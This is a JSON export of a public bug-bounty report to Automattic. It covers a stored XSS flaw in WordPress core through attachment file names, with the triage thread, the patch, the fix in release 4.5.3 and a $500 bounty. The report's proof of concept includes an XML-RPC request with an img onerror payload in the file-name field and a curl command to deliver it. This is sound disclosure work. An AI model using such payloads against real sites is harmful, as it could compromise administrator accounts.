{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-07-06T22:07:01.031Z", 
    "voters": [
        "hunter", 
        "shailesh4594", 
        "skansing", 
        "eronx", 
        "supernatural", 
        "muhammad_uwais", 
        "xsam", 
        "jaypatel", 
        "jens", 
        "null-byte", 
        "and 14 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 139245, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "WordPress core stored XSS via attachment file name", 
    "is_member_of_team?": null, 
    "vote_count": 24, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-08-05T22:07:01.144Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-05-17T06:06:06.683Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T06:06:06.683Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "I checked wordpress.com and it works there too in the media list.\n", 
            "markdown_message": "<p>I checked wordpress.com and it works there too in the media list.</p>\n", 
            "type": "Activities::Comment", 
            "id": 960621, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-17T08:58:55.369Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T08:58:55.369Z", 
            "actor": {
                "username": "vortfu", 
                "url": "/vortfu", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/982/b80411c54ee08b9579811d3427a54368f8d03d09_medium.png?1422255349"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Thanks for the report, the WordPress Security Team has been notified of this issue.", 
            "markdown_message": "<p>Thanks for the report, the WordPress Security Team has been notified of this issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 960802, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/094/325/bb11b93e247431e0f5fa10a48ab24fe48ca80732/wordpresscom.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVYUZEEBI%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225049Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDMO36pSTeUTC%2FSulZyK3A%2F5%2B%2FTOIgP6UP6H0wSySVBbyL4FQzfP8bav04ajjwBBaxmOhkHA2wujzRb5TbhMhSerMFHQMs%2BlaWPr9zHOl9bbpq8AObWm7%2BuYiH%2BdA7DVleq4N%2BRlVWG6ukszpeguapBWm%2BeaJz0G%2BtsAf0URs%2FZMn4gmiEGoILlZfH0Rxga04TPWKr%2BmJq3DgVJVO8RtbrjLs0%2BhbTb5D6fQvXvZFqnYE5Cq1E4wzEU6Z0Vk16WfzancxdjY7xdYjXkaE4By4xpRprbRaCsQPyDiBmTv0e4fZZUzHn9AjPRxIaswdwrcjaXpaPttjxFnmTigGxFQd%2FIk%2BnLBRveHtHrDZMcPESe9UFT8iakt2ZZLVeHA2xYnKx1ntoUshuUm75iMCEVRsFrVOfDopKYAuhSUTkGAp4XOliz2GytEQUQkeqhliO5VdioSueZvZadU9HHNOh5%2B90tBDDLxOK4Kh1FDQaJDMx84K%2FsBLvwqLH2hzqyXyNTjWFchQyXDNcu04rcBuH9%2BWWM9YV2K9gLNj%2BPuUU2uBat%2FkH9T3MGSQLTZehkqVxj%2BKPShN9%2Bsy39j%2FW%2BarOzYC1kRM0e%2F%2FsEso25Km4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ce22aa463cb016512d6e997c4cc024b4a32badb875e1d0e4c795fc2124d4598f", 
                    "type": "image/png", 
                    "id": 94325, 
                    "filename": "wordpresscom.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-05-17T15:26:49.258Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T15:26:49.258Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "screenshot attached, upload didn't work earlier.", 
            "markdown_message": "<p>screenshot attached, upload didn&#39;t work earlier.</p>\n", 
            "type": "Activities::Comment", 
            "id": 961477, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-24T16:03:25.785Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-24T16:03:25.785Z", 
            "actor": {
                "username": "nikolayb", 
                "url": "/nikolayb", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/838/bdb9f3990471ad2eda2fe4178ea5e0903205b548_medium.jpg?1440552943"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Hello Jouko,\n\nThank you again for the report, we reproduced it and we have a patch that I can send to test, if you\u2019d like. We\u2019re still looking at some details on the approach \u2013 thinking of ways to make it safer for plugins  (or forgotten pieces in core) that aren\u2019t escaping the value.\n\nAs for release, we have a point release planned in few weeks that will also include few other security fixes. How does it sound to include the fix for this one there?\n\nLast, but not least, have something changed in the way you\u2019d like to be credited? Before it was Jouko Pynn\u00f6nen, linking to http://klikki.fi/.", 
            "markdown_message": "<p>Hello Jouko,</p>\n\n<p>Thank you again for the report, we reproduced it and we have a patch that I can send to test, if you\u2019d like. We\u2019re still looking at some details on the approach \u2013 thinking of ways to make it safer for plugins  (or forgotten pieces in core) that aren\u2019t escaping the value.</p>\n\n<p>As for release, we have a point release planned in few weeks that will also include few other security fixes. How does it sound to include the fix for this one there?</p>\n\n<p>Last, but not least, have something changed in the way you\u2019d like to be credited? Before it was Jouko Pynn\u00f6nen, linking to <a title=\"http://klikki.fi/\" href=\"/redirect?signature=9bab95f40a15c53f4aef7383b7af088ee3f307ba&amp;url=http%3A%2F%2Fklikki.fi%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://klikki.fi/</span><i class=\"icon-external-link\"></i></a>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 981511, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-25T05:45:59.826Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-25T05:45:59.826Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Ok. I can check out the patch, put it here or jouko@iki.fi. Can you also change the credits link to https://klikki.fi ", 
            "markdown_message": "<p>Ok. I can check out the patch, put it here or <a title=\"jouko@iki.fi\" href=\"mailto:jouko@iki.fi\" rel=\"nofollow noopener noreferrer\">jouko@iki.fi</a>. Can you also change the credits link to <a title=\"https://klikki.fi\" href=\"/redirect?signature=c7fa851563efa7ffb1f15c87795245bbdffee737&amp;url=https%3A%2F%2Fklikki.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://klikki.fi</span><i class=\"icon-external-link\"></i></a> </p>\n", 
            "type": "Activities::Comment", 
            "id": 982655, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-26T12:44:30.905Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-26T12:44:30.905Z", 
            "actor": {
                "username": "vortfu", 
                "url": "/vortfu", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/982/b80411c54ee08b9579811d3427a54368f8d03d09_medium.png?1422255349"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 984894, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/096/286/38b020d766c85ca2a95a9167ef1fa89ff6aff72c/139245.0.diff?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVYUZEEBI%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225049Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDMO36pSTeUTC%2FSulZyK3A%2F5%2B%2FTOIgP6UP6H0wSySVBbyL4FQzfP8bav04ajjwBBaxmOhkHA2wujzRb5TbhMhSerMFHQMs%2BlaWPr9zHOl9bbpq8AObWm7%2BuYiH%2BdA7DVleq4N%2BRlVWG6ukszpeguapBWm%2BeaJz0G%2BtsAf0URs%2FZMn4gmiEGoILlZfH0Rxga04TPWKr%2BmJq3DgVJVO8RtbrjLs0%2BhbTb5D6fQvXvZFqnYE5Cq1E4wzEU6Z0Vk16WfzancxdjY7xdYjXkaE4By4xpRprbRaCsQPyDiBmTv0e4fZZUzHn9AjPRxIaswdwrcjaXpaPttjxFnmTigGxFQd%2FIk%2BnLBRveHtHrDZMcPESe9UFT8iakt2ZZLVeHA2xYnKx1ntoUshuUm75iMCEVRsFrVOfDopKYAuhSUTkGAp4XOliz2GytEQUQkeqhliO5VdioSueZvZadU9HHNOh5%2B90tBDDLxOK4Kh1FDQaJDMx84K%2FsBLvwqLH2hzqyXyNTjWFchQyXDNcu04rcBuH9%2BWWM9YV2K9gLNj%2BPuUU2uBat%2FkH9T3MGSQLTZehkqVxj%2BKPShN9%2Bsy39j%2FW%2BarOzYC1kRM0e%2F%2FsEso25Km4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bc44ef262b7275d1449ecec7d3e14fdfae00f37281d998310c08afb140df309c", 
                    "type": "text/x-diff", 
                    "id": 96286, 
                    "filename": "139245.0.diff"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-05-26T19:56:35.826Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-26T19:56:35.826Z", 
            "actor": {
                "username": "nikolayb", 
                "url": "/nikolayb", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/838/bdb9f3990471ad2eda2fe4178ea5e0903205b548_medium.jpg?1440552943"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Here is the current patch that escapes the values, I would appreciate if you try to break it :)\n\nWe\u2019re looking for a better backwards-compatible and portable across filesystems way to restrict what filenames we accept.", 
            "markdown_message": "<p>Here is the current patch that escapes the values, I would appreciate if you try to break it :)</p>\n\n<p>We\u2019re looking for a better backwards-compatible and portable across filesystems way to restrict what filenames we accept.</p>\n", 
            "type": "Activities::Comment", 
            "id": 985794, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-07T19:08:16.125Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-07T19:08:16.125Z", 
            "actor": {
                "username": "nikolayb", 
                "url": "/nikolayb", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/838/bdb9f3990471ad2eda2fe4178ea5e0903205b548_medium.jpg?1440552943"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Hey again, Jouko, did you have a chance to test out the patch and confirm whether it fixes the issue?", 
            "markdown_message": "<p>Hey again, Jouko, did you have a chance to test out the patch and confirm whether it fixes the issue?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1003462, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-08T13:48:02.351Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-08T13:48:02.351Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Yes, seems quite straightforward and fixes the issue as far as I can see.", 
            "markdown_message": "<p>Yes, seems quite straightforward and fixes the issue as far as I can see.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1004604, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "created_at": "2016-06-23T12:39:23.961Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-23T12:39:23.961Z", 
            "actor": {
                "username": "nikolayb", 
                "url": "/nikolayb", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/838/bdb9f3990471ad2eda2fe4178ea5e0903205b548_medium.jpg?1440552943"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Hey, Jouko, the fix was released: https://wordpress.org/news/2016/06/wordpress-4-5-3/\n\nThanks again for the responsible disclosure, the bounty will follow shortly.", 
            "markdown_message": "<p>Hey, Jouko, the fix was released: <a title=\"https://wordpress.org/news/2016/06/wordpress-4-5-3/\" href=\"/redirect?signature=082a6e4d46b9064e33375b61e43cbac87f280dc2&amp;url=https%3A%2F%2Fwordpress.org%2Fnews%2F2016%2F06%2Fwordpress-4-5-3%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://wordpress.org/news/2016/06/wordpress-4-5-3/</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Thanks again for the responsible disclosure, the bounty will follow shortly.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1029989, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-07-06T21:43:11.216Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-06T21:43:11.216Z", 
            "actor": {
                "url": "/automattic", 
                "profile": {
                    "name": "Automattic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
                }
            }, 
            "team_handle": "automattic", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1056470, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-06T22:07:01.090Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-06T22:07:01.090Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1056509, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-05T22:07:08.697Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-05T22:07:08.697Z", 
            "actor": {
                "url": "/automattic", 
                "profile": {
                    "name": "Automattic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
                }
            }, 
            "team_handle": "automattic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1109118, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jouko", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jouko", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/013/642/84ded716b305011af6c7091e630ca8ac2c590a87_small.jpg?1423004250"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -73701827.97132432, 
    "disclosed_at": "2016-08-05T22:07:08.621Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/139245", 
    "created_at": "2016-05-17T05:47:51.134Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>I think there&#39;s a problem with missing HTML encoding of attachment file names. A user with the capability to create attachments could compromise other accounts including administrator by injecting HTML tags in the file name.</p>\n\n<p>Creating attachment with arbitrary filenames is possible at least via the XMLRPC wp.newPost() function.</p>\n\n<p>With a quick search I found two places where the filename is not HTML-escaped. First, <code>wp-admin/includes/class-wp-media-list-table.php</code>:</p>\n<pre class=\"highlight php\"><code>                <span class=\"nt\">&lt;p</span> <span class=\"na\">class=</span><span class=\"s\">&quot;filename&quot;</span><span class=\"nt\">&gt;</span>\n                        <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">&quot;screen-reader-text&quot;</span><span class=\"nt\">&gt;</span><span class=\"cp\">&lt;?php</span> <span class=\"nx\">_e</span><span class=\"p\">(</span> <span class=\"s1\">&#39;File name:&#39;</span> <span class=\"p\">);</span> <span class=\"cp\">?&gt;</span> <span class=\"nt\">&lt;/span&gt;</span>\n                        <span class=\"cp\">&lt;?php</span>\n                        <span class=\"nv\">$file</span> <span class=\"o\">=</span> <span class=\"nx\">get_attached_file</span><span class=\"p\">(</span> <span class=\"nv\">$post</span><span class=\"o\">-&gt;</span><span class=\"na\">ID</span> <span class=\"p\">);</span>\n                        <span class=\"k\">echo</span> <span class=\"nx\">wp_basename</span><span class=\"p\">(</span> <span class=\"nv\">$file</span> <span class=\"p\">);</span>\n                        <span class=\"cp\">?&gt;</span>\n                <span class=\"nt\">&lt;/p&gt;</span>\n</code></pre>\n<p>The injected script is triggered when a user clicks the <em>Media</em> menu in the Dashboard.</p>\n\n<p>The second is the attachment page found e.g. with the <em>attachment_id=xxx</em> query parameter. It might be theme-dependent. I checked Twenty Fourteen and Twenty Sixteen and both were vulnerable.</p>\n\n<h1 id=\"poc\">PoC</h1>\n\n<ol>\n<li>\n<p>Create a file called <code>xss.xml</code>:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot;?&gt;</span>\n<span class=\"nt\">&lt;methodCall&gt;</span>\n<span class=\"nt\">&lt;methodName&gt;</span>wp.newPost<span class=\"nt\">&lt;/methodName&gt;</span>\n<span class=\"nt\">&lt;params&gt;</span>\n    <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>empty<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n    <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>username<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n    <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>password<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n    <span class=\"nt\">&lt;param&gt;&lt;struct&gt;</span>\n            <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_title<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>aaa<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n            <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_type<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>attachment<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n            <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_content<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>bbb<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n            <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_status<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>publish<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n            <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>file<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>ccc&#39;<span class=\"ni\">&amp;gt;</span>test<span class=\"ni\">&amp;lt;</span>img src=x onerror=alert(&#39;xss&#39;) onload=alert(&#39;xss&#39;)<span class=\"ni\">&amp;gt;</span><span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n    <span class=\"nt\">&lt;/struct&gt;&lt;/param&gt;</span>       \n<span class=\"nt\">&lt;/params&gt;</span>\n<span class=\"nt\">&lt;/methodCall&gt;</span>\n</code></pre>\n</li>\n<li><p>Send the request with</p></li>\n</ol>\n<pre class=\"highlight shell\"><code>curl <span class=\"s1\">&#39;https://wordpress.site/xmlrpc.php&#39;</span> --data-binary <span class=\"s2\">&quot;</span><span class=\"sb\">`</span>cat xss.xml<span class=\"sb\">`</span><span class=\"s2\">&quot;</span> -H <span class=\"s1\">&#39;Content-type: application/xml&#39;</span>\n</code></pre>\n<ol>\n<li>Go to the Dashboard as an administrator and view the media list. An alert box should appear. Only the <em>list</em> mode seems to be vulnerable but apparently it&#39;s the default.</li>\n</ol>\n", 
    "vulnerability_information": "I think there's a problem with missing HTML encoding of attachment file names. A user with the capability to create attachments could compromise other accounts including administrator by injecting HTML tags in the file name.\n\nCreating attachment with arbitrary filenames is possible at least via the XMLRPC wp.newPost() function.\n\nWith a quick search I found two places where the filename is not HTML-escaped. First, `wp-admin/includes/class-wp-media-list-table.php`:\n~~~~ php\n                <p class=\"filename\">\n                        <span class=\"screen-reader-text\"><?php _e( 'File name:' ); ?> </span>\n                        <?php\n                        $file = get_attached_file( $post->ID );\n                        echo wp_basename( $file );\n                        ?>\n                </p>\n~~~~\nThe injected script is triggered when a user clicks the *Media* menu in the Dashboard.\n\nThe second is the attachment page found e.g. with the *attachment_id=xxx* query parameter. It might be theme-dependent. I checked Twenty Fourteen and Twenty Sixteen and both were vulnerable.\n\n#PoC#\n1. Create a file called `xss.xml`:\n~~~~ xml\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>wp.newPost</methodName>\n<params>\n        <param><value>empty</value></param>\n        <param><value>username</value></param>\n        <param><value>password</value></param>\n        <param><struct>\n                <member><name>post_title</name><value>aaa</value></member>\n                <member><name>post_type</name><value>attachment</value></member>\n                <member><name>post_content</name><value>bbb</value></member>\n                <member><name>post_status</name><value>publish</value></member>\n                <member><name>file</name><value>ccc'&gt;test&lt;img src=x onerror=alert('xss') onload=alert('xss')&gt;</value></member>\n        </struct></param>       \n</params>\n</methodCall>\n~~~~\n\n2. Send the request with\n\n~~~~ sh\ncurl 'https://wordpress.site/xmlrpc.php' --data-binary \"`cat xss.xml`\" -H 'Content-type: application/xml'\n~~~~\n\n3. Go to the Dashboard as an administrator and view the media list. An alert box should appear. Only the *list* mode seems to be vulnerable but apparently it's the default.\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://automattic.com", 
            "about": "WordPress.com, VaultPress, Akismet, Gravatar, Cloudup, WooCommerce, Polldaddy and more!", 
            "twitter_handle": "", 
            "name": "Automattic"
        }, 
        "handle": "automattic", 
        "url": "https://hackerone.com/automattic", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/111/6b5147b71079b286c99869a85682f609f6c617c6_small.png?1396031864", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 111, 
        "default_currency": "usd"
    }, 
    "is_published": false
}